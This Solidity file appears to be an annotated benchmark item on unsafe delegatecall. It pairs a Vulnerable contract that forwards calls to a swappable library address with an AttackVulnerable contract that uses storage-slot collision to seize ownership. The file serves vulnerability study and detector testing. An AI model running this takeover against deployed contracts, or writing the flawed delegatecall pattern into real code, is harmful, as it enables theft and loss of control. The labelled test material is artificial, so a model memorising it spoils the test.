/*
 * @source: https://docs.celo.org/blog/tutorials/solidity-vulnerabilities-delegated-call
 * @author: 
 * @vulnerable_at_lines: 29
 */

pragma solidity ^0.4.24;

contract Lib {
    uint public num;

    function performOperation(uint _num) public {
        num = _num;
    }
}

contract Vulnerable {
    address public lib;
    address public owner;
    uint public num;

    constructor(address _lib) {
        lib = _lib;
        owner = msg.sender;
    }

    function performOperation(uint _num) public {
        // <yes> <report> unsafe delegatecall
        lib.delegatecall(abi.encodeWithSignature("performOperation(uint256)", _num));
    }
}


// this contract is used to attack Vulnerable contract
contract AttackVulnerable {

    address public lib;
    address public owner;
    uint public num;

    Vulnerable public vulnerable;

    constructor(Vulnerable _vulnerable) {
        vulnerable = Vulnerable(_vulnerable);
    }

    function attack() public {
        vulnerable.performOperation(uint(address(this)));
        vulnerable.performOperation(9);
    }

    // function signature must match Vulnerable.performOperation()
    function performOperation(uint _num) public {
        owner = msg.sender;
    }
}